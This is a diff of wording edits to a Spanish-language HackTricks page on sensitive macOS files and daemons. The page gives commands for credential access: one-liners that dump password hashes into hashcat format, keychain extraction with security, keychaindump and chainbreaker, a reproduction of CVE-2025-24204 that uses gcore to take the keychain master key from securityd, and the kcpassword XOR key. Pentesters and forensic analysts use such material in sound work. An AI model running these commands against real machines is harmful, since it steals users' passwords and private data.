@@ -1,4 +1,4 @@
-# Ubicaciones sensibles e interesantes y daemons de macOS
+# Ubicaciones sensibles y daemons interesantes de macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -6,26 +6,26 @@
 
 ### Contraseñas shadow
 
-La contraseña shadow se almacena junto con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
+La contraseña shadow se almacena con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
 El siguiente one-liner se puede utilizar para volcar **toda la información sobre los usuarios** (incluida la información de los hashes):
 ```bash
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
 [**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**este**](https://github.com/octomagon/davegrohl.git) pueden utilizarse para transformar el hash al **formato** de **hashcat**.
 
-Un **one-liner** alternativo que volcará las credenciales de todas las cuentas que no sean de servicio en formato de hashcat `-m 7100` (macOS PBKDF2-SHA512):
+Una one-liner alternativa que volcará las credenciales de todas las cuentas que no sean de servicio en formato de hashcat `-m 7100` (macOS PBKDF2-SHA512):
 ```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
-Otra forma de obtener el `ShadowHashData` de un usuario es usando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
+Otra forma de obtener el `ShadowHashData` de un usuario es utilizando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
 
 ### /etc/master.passwd
 
-Este archivo **solo se usa** cuando el sistema se está ejecutando en **single-user mode** (por lo que no es muy frecuente).
+Este archivo se **utiliza únicamente** cuando el sistema se ejecuta en **single-user mode** (por lo que no es muy frecuente).
 
-### Dump de Keychain
+### Keychain Dump
 
-Ten en cuenta que, al usar el binario `security` para **volcar las contraseñas descifradas**, aparecerán varios avisos que pedirán al usuario que permita esta operación.
+Ten en cuenta que, al utilizar el binario `security` para **dump** de las contraseñas descifradas, aparecerán varios avisos solicitando al usuario que permita esta operación.
 ```bash
 #security
 security dump-trust-settings [-s] [-d] #List certificates
@@ -34,7 +34,7 @@ security list-smartcards #List smartcards
 security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
 security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
 ```
-En el macOS moderno, los **backing stores** más interesantes suelen ser **`~/Library/Keychains/login.keychain-db`** y **`/Library/Keychains/System.keychain`**. Son archivos respaldados por SQLite, pero el acceso en texto plano sigue estando gestionado por **`securityd`**: robar la DB sin procesar principalmente proporciona metadatos y blobs cifrados, a menos que también recuperes la contraseña del usuario, `SystemKey` o una master key en memoria.<sup>[2]</sup>
+En macOS moderno, los backing stores más interesantes suelen ser **`~/Library/Keychains/login.keychain-db`** y **`/Library/Keychains/System.keychain`**. Son archivos respaldados por SQLite, pero el acceso en texto plano sigue estando intermediado por **`securityd`**: robar la DB sin procesar principalmente proporciona metadatos y blobs cifrados, a menos que también recuperes la contraseña del usuario, `SystemKey` o una master key en memoria.<sup>[[2]](#references)</sup>
 
 ### [Keychaindump](https://github.com/juuso/keychaindump)
 
@@ -43,30 +43,30 @@ En el macOS moderno, los **backing stores** más interesantes suelen ser **`~/Li
 
 ### Descripción general de Keychaindump
 
-Se ha desarrollado una herramienta llamada **keychaindump** para extraer contraseñas de los keychains de macOS, pero presenta limitaciones en versiones más recientes de macOS, como Big Sur, según se indica en una [discusión](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). El uso de **keychaindump** requiere que el atacante obtenga acceso y escale privilegios hasta **root**. La herramienta aprovecha el hecho de que el keychain se desbloquea de forma predeterminada cuando el usuario inicia sesión, por comodidad, lo que permite a las aplicaciones acceder a él sin solicitar repetidamente la contraseña del usuario. Sin embargo, si un usuario decide bloquear su keychain después de cada uso, **keychaindump** deja de ser eficaz.
+Se ha desarrollado una herramienta llamada **keychaindump** para extraer contraseñas de los keychains de macOS, pero presenta limitaciones en versiones más recientes de macOS, como Big Sur, según se indica en una [discusión](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). El uso de **keychaindump** requiere que el atacante obtenga acceso y escale privilegios hasta **root**. La herramienta aprovecha el hecho de que el keychain se desbloquea de forma predeterminada al iniciar sesión el usuario, por comodidad, lo que permite a las aplicaciones acceder a él sin solicitar repetidamente la contraseña del usuario. Sin embargo, si el usuario opta por bloquear su keychain después de cada uso, **keychaindump** deja de ser eficaz.
 
-**Keychaindump** funciona atacando un proceso específico llamado **securityd**, descrito por Apple como un daemon para operaciones de autorización y criptografía, fundamental para acceder al keychain. El proceso de extracción implica identificar una **Master Key** derivada de la contraseña de inicio de sesión del usuario. Esta clave es esencial para leer el archivo del keychain. Para localizar la **Master Key**, **keychaindump** analiza el heap de memoria de **securityd** mediante el comando `vmmap`, buscando posibles claves dentro de áreas marcadas como `MALLOC_TINY`. El siguiente comando se utiliza para inspeccionar estas ubicaciones de memoria:
+**Keychaindump** funciona apuntando a un proceso específico llamado **securityd**, descrito por Apple como un daemon para operaciones de autorización y criptográficas, fundamental para acceder al keychain. El proceso de extracción implica identificar una **Master Key** derivada de la contraseña de inicio de sesión del usuario. Esta clave es esencial para leer el archivo del keychain. Para localizar la **Master Key**, **keychaindump** analiza el heap de memoria de **securityd** mediante el comando `vmmap`, buscando posibles claves en áreas marcadas como `MALLOC_TINY`. El siguiente comando se utiliza para inspeccionar estas ubicaciones de memoria:
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-Tras identificar posibles claves maestras, **keychaindump** busca en los heaps un patrón específico (`0x0000000000000018`) que indica un candidato a clave maestra. Se requieren pasos adicionales, incluida la desofuscación, para utilizar esta clave, tal como se describe en el código fuente de **keychaindump**. Los analistas que trabajen en esta área deben tener en cuenta que los datos cruciales para descifrar el llavero se almacenan en la memoria del proceso **securityd**. Un ejemplo de comando para ejecutar **keychaindump** es:
+Después de identificar posibles claves maestras, **keychaindump** busca en los heaps un patrón específico (`0x0000000000000018`) que indica un candidato para la clave maestra. Para utilizar esta clave, se requieren pasos adicionales, incluida la desofuscación, tal como se describe en el código fuente de **keychaindump**. Los analistas que se centren en esta área deben tener en cuenta que los datos cruciales para descifrar el keychain se almacenan en la memoria del proceso **securityd**. Un ejemplo de comando para ejecutar **keychaindump** es:
 ```bash
 sudo ./keychaindump
 ```
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) puede utilizarse para extraer los siguientes tipos de información de un keychain de OSX de forma forense:
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker) se puede utilizar para extraer los siguientes tipos de información de un keychain de OSX de manera forense:
 
-- Contraseña del keychain con hash, adecuada para cracking con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
+- Contraseña hasheada del keychain, adecuada para crackearla con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
 - Contraseñas de Internet
 - Contraseñas genéricas
 - Claves privadas
 - Claves públicas
 - Certificados X509
-- Secure Notes
+- Notas seguras
 - Contraseñas de Appleshare
 
-Dada la contraseña de desbloqueo del keychain, una clave maestra obtenida mediante [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará contraseñas en texto plano.
+Dada la contraseña de desbloqueo del keychain, una master key obtenida mediante [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará las contraseñas en texto plano.
 
 Sin uno de estos métodos para desbloquear el keychain, Chainbreaker mostrará toda la demás información disponible.
 
@@ -75,7 +75,7 @@ Sin uno de estos métodos para desbloquear el keychain, Chainbreaker mostrará t
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
-#### **Volcar claves del keychain (con contraseñas) con SystemKey**
+#### **Volcar las claves del keychain (con contraseñas) con SystemKey**
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -92,9 +92,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Volcar claves de keychain (con contraseñas) con memory dump**
+#### **Extraer las claves del keychain (con contraseñas) con un volcado de memoria**
 
-[Sigue estos pasos](../index.html#dumping-memory-with-osxpmem) para realizar un **memory dump**
+[Siguiendo estos pasos](../index.html#dumping-memory-with-osxpmem) para realizar un **volcado de memoria**
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -103,16 +103,16 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Dump de claves del keychain (con contraseñas) usando la contraseña del usuario**
+#### **Volcar claves del llavero (con contraseñas) usando la contraseña del usuario**
 
-Si conoces la contraseña del usuario, puedes usarla para **volcar y descifrar los keychains que pertenecen al usuario**.
+Si conoces la contraseña del usuario, puedes usarla para **volcar y descifrar los llaveros que pertenecen al usuario**.
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
-### Clave maestra de Keychain mediante el entitlement `gcore` (CVE-2025-24204)
+### Clave maestra del Keychain mediante el entitlement `gcore` (CVE-2025-24204)
 
-macOS 15.0 (Sequoia) incluía `/usr/bin/gcore` con el entitlement **`com.apple.system-task-ports.read`**, por lo que cualquier administrador local (o aplicación firmada maliciosa) podía volcar la memoria de cualquier proceso incluso con SIP/TCC aplicados. Volcar `securityd` filtra la **clave maestra de Keychain** en claro y permite descifrar `login.keychain-db` sin la contraseña del usuario.<sup>[1]</sup>
+macOS 15.0 (Sequoia) incluía `/usr/bin/gcore` con el entitlement **`com.apple.system-task-ports.read`**, por lo que cualquier administrador local (o aplicación maliciosa firmada) podía volcar la memoria de cualquier proceso incluso con SIP/TCC aplicados. Volcar `securityd` filtra la **clave maestra del Keychain** en texto claro y permite descifrar `login.keychain-db` sin la contraseña del usuario.<sup>[[1]](#references)</sup>
 
 **Reproducción rápida en versiones vulnerables (15.0–15.2):**
 ```bash
@@ -127,13 +127,13 @@ c=m.group(0)
 if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
 PY $(pgrep securityd)
 ```
-Introduce la clave hexadecimal extraída en Chainbreaker (`--key <hex>`) para descifrar el llavero de inicio de sesión. Apple eliminó el entitlement en **macOS 15.3+**, por lo que esto solo funciona en builds de Sequoia sin parches o en sistemas que conservaron el binario vulnerable.
+Introduce la clave hex extraída en Chainbreaker (`--key <hex>`) para descifrar el llavero de inicio de sesión. Apple eliminó el entitlement en **macOS 15.3+**, por lo que esto solo funciona en builds de Sequoia sin parches o en sistemas que conservaron el binario vulnerable.
 
 ### kcpassword
 
 El archivo **kcpassword** contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **habilitado el inicio de sesión automático**. Por lo tanto, el usuario iniciará sesión automáticamente sin que se le solicite una contraseña (lo cual no es muy seguro).
 
-La contraseña se almacena en el archivo **`/etc/kcpassword`** mediante XOR con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña del usuario es más larga que la clave, la clave se reutilizará.\
+La contraseña se almacena en el archivo **`/etc/kcpassword`** aplicando XOR con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña del usuario es más larga que la clave, esta se reutilizará.\
 Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo, usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).
 
 ## Información interesante en bases de datos
@@ -148,9 +148,9 @@ sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
 ### Notificaciones
 
-Antes de **Sequoia**, normalmente puedes encontrar el almacén de Notification Center en **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. En **Sequoia+**, Apple lo movió al contenedor de grupo protegido por TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.
+Antes de **Sequoia**, normalmente puedes encontrar el almacén de Notification Center en **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. En **Sequoia+**, Apple lo trasladó al contenedor de grupo protegido por TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.
 
-La mayor parte de la información interesante se almacena dentro de columnas **blob**, por lo que tendrás que extraer ese contenido y transformarlo en algo legible (`plutil -p -`, `strings` o un parser pequeño). Ejemplos de triage rápido:
+La mayor parte de la información interesante se almacena dentro de columnas **blob**, por lo que tendrás que extraer ese contenido y transformarlo en algo legible (`plutil -p -`, `strings` o un pequeño parser). Ejemplos rápidos de triage:
 ```bash
 # Legacy location (older releases / affected builds)
 DA=$(getconf DARWIN_USER_DIR)
@@ -160,11 +160,11 @@ sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from recor
 # Sequoia+ location (TCC-protected)
 sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
 ```
-#### Problemas recientes de privacidad (base de datos de NotificationCenter)
+#### Problemas recientes de privacidad (NotificationCenter DB)
 
-- En macOS **14.7–15.1**, Apple almacenaba el contenido de los banners en `db2/db` de SQLite sin una redacción adecuada. Las CVE **CVE-2024-44292/44293/40838/54504** permitían que cualquier usuario local leyera el texto de las notificaciones de otros usuarios simplemente abriendo la DB (sin un aviso de TCC).
-- Apple mitigó esto trasladando la DB a `group.com.apple.usernoted` y protegiéndola con TCC en las versiones más recientes de Sequoia, por lo que en los sistemas actuales normalmente se necesita el contexto del usuario adecuado o un bypass de TCC para leerla.<sup>[3]</sup>
-- En endpoints legacy, copia los archivos `db`, `db-wal` y `db-shm` juntos antes de actualizar o reiniciar si quieres conservar los artefactos.
+- En macOS **14.7–15.1**, Apple almacenaba el contenido de los banners en `db2/db` SQLite sin una redacción adecuada. Los CVE **CVE-2024-44292/44293/40838/54504** permitían que cualquier usuario local leyera el texto de las notificaciones de otros usuarios simplemente abriendo la DB (sin mostrar ningún aviso de TCC).
+- Apple mitigó esto moviendo la DB a `group.com.apple.usernoted` y protegiéndola con TCC en versiones más recientes de Sequoia, por lo que en los sistemas actuales normalmente se necesita el contexto del usuario adecuado o un bypass de TCC para leerla.<sup>[[3]](#references)</sup>
+- En endpoints legacy, copia juntos los archivos `db`, `db-wal` y `db-shm` antes de actualizar o reiniciar si quieres conservar los artefactos.
 
 ### Notas
 
@@ -175,31 +175,31 @@ sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tabl
 # ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
 for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
 ```
-Si el one-liner anterior genera demasiado ruido, exporta `ZICNOTEDATA.ZDATA`, aplica `gunzip` y analiza el protobuf: normalmente es más fiable que ejecutar `strings` directamente sobre el SQLite.
+Si el one-liner anterior genera demasiado ruido, exporta `ZICNOTEDATA.ZDATA`, hazle gunzip y parsea el protobuf: normalmente es más fiable que ejecutar `strings` directamente sobre SQLite.
 
-### Tareas en segundo plano / Elementos de inicio de sesión
+### Tareas en segundo plano / elementos de inicio de sesión
 
-Desde **Ventura**, los elementos de inicio de sesión aprobados por el usuario y varias tareas en segundo plano se registran en almacenes **BTM**, como **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** y la caché del sistema versionada **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.
+Desde **Ventura**, los elementos de inicio de sesión aprobados por el usuario y varias tareas en segundo plano se registran en stores **BTM**, como **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** y la caché del sistema versionada **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.
 
-Estos archivos son útiles para identificar rápidamente persistence, herramientas auxiliares y algunos elementos en segundo plano gestionados por MDM:
+Estos archivos son útiles para identificar rápidamente la persistencia, las herramientas auxiliares y algunos elementos en segundo plano gestionados por MDM:
 ```bash
 plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
 sfltool dumpbtm
 ```
-Para el ámbito de la persistencia y los aspectos internos de BTM, consulta [la página de ubicaciones de auto-inicio](../../macos-auto-start-locations.md#login-items) y [las notas sobre Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).
+Para el enfoque de persistencia y los elementos internos de BTM, consulta [la página de ubicaciones de auto-start](../../macos-auto-start-locations.md#login-items) y [las notas sobre Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).
 
 ## Preferencias
 
-En las apps de macOS, las preferencias se encuentran en **`$HOME/Library/Preferences`** y en iOS están en `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
+En las aplicaciones de macOS, las preferencias se encuentran en **`$HOME/Library/Preferences`** y en iOS están en `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
 
 En macOS, la herramienta cli **`defaults`** se puede utilizar para **modificar el archivo de Preferencias**.
 
-**`/usr/sbin/cfprefsd`** registra los servicios XPC `com.apple.cfprefsd.daemon` y `com.apple.cfprefsd.agent`, y se puede llamar para realizar acciones como modificar preferencias.
+**`/usr/sbin/cfprefsd`** reclama los servicios XPC `com.apple.cfprefsd.daemon` y `com.apple.cfprefsd.agent`, y puede ser llamado para realizar acciones como modificar preferencias.
 
 ## OpenDirectory permissions.plist
 
 El archivo `/System/Library/OpenDirectory/permissions.plist` contiene permisos aplicados a los atributos de los nodos y está protegido por SIP.\
-Este archivo concede permisos a usuarios específicos mediante UUID (y no uid), lo que les permite acceder a información sensible específica como `ShadowHashData`, `HeimdalSRPKey` y `KerberosKeys`, entre otros:
+Este archivo concede permisos a usuarios específicos mediante UUID (y no uid), lo que les permite acceder a información sensible específica como `ShadowHashData`, `HeimdalSRPKey` y `KerberosKeys`, entre otras:
 ```xml
 [...]
 <key>dsRecTypeStandard:Computers</key>
@@ -236,7 +236,7 @@ Este archivo concede permisos a usuarios específicos mediante UUID (y no uid), 
 
 ### Notificaciones de Darwin
 
-El daemon principal para las notificaciones es **`/usr/sbin/notifyd`**. Para recibir notificaciones, los clientes deben registrarse a través del puerto Mach `com.apple.system.notification_center` (compruébalo con `sudo lsmp -p <pid notifyd>`). El daemon se puede configurar con el archivo `/etc/notify.conf`.
+El daemon principal para las notificaciones es **`/usr/sbin/notifyd`**. Para recibir notificaciones, los clientes deben registrarse mediante el puerto Mach `com.apple.system.notification_center` (puedes comprobarlo con `sudo lsmp -p <pid notifyd>`). El daemon se puede configurar con el archivo `/etc/notify.conf`.
 
 Los nombres utilizados para las notificaciones son notaciones DNS inversas únicas y, cuando se envía una notificación a uno de ellos, la recibirán los clientes que hayan indicado que pueden gestionarla.
 
@@ -258,7 +258,7 @@ common: com.apple.security.octagon.joined-with-bottle
 ```
 ### Centro de notificaciones distribuido
 
-El **Centro de notificaciones distribuido**, cuyo binario principal es **`/usr/sbin/distnoted`**, es otra forma de enviar notificaciones. Expone algunos servicios XPC y realiza ciertas comprobaciones para intentar verificar a los clientes.
+El **Distributed Notification Center**, cuyo binario principal es **`/usr/sbin/distnoted`**, es otra forma de enviar notificaciones. Expone algunos servicios XPC y realiza ciertas comprobaciones para intentar verificar a los clientes.
 
 ### Apple Push Notifications (APN)
 
@@ -271,7 +271,7 @@ Existe una base de datos local de mensajes ubicada en macOS en `/Library/Applica
 ```bash
 sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 ```
-También es posible obtener información sobre el daemon y las conexiones usando:
+También es posible obtener información sobre el daemon y las conexiones utilizando:
 ```bash
 /System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
 ```
@@ -279,13 +279,13 @@ También es posible obtener información sobre el daemon y las conexiones usando
 
 Estas son notificaciones que el usuario debería ver en la pantalla:
 
-- **`CFUserNotification`**: Estas API proporcionan una forma de mostrar en pantalla una ventana emergente con un mensaje.
+- **`CFUserNotification`**: Estas API proporcionan una forma de mostrar en la pantalla una ventana emergente con un mensaje.
 - **The Bulletin Board**: Esto muestra en iOS un banner que desaparece y se almacena en el Notification Center.
-- **`NSUserNotificationCenter`**: Este es el bulletin board de iOS en macOS. En versiones antiguas de macOS, la base de datos suele estar en `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; en Sequoia+ se movió a `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.
+- **`NSUserNotificationCenter`**: Este es el bulletin board de iOS en macOS. En versiones antiguas de macOS, la base de datos suele encontrarse en `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; en Sequoia+ se trasladó a `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.
 
 ## Referencias
 
-- [1] [HelpNetSecurity – El entitlement de gcore de macOS permitió la extracción de la master key del Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
+- [1] [HelpNetSecurity – El entitlement gcore de macOS permitía la extracción de la master key del Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
 - [2] [Apple Platform Security – Protección de datos del Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
 - [3] [9to5Mac – Apple aborda las preocupaciones de privacidad en torno a la base de datos del Notification Center en macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
 
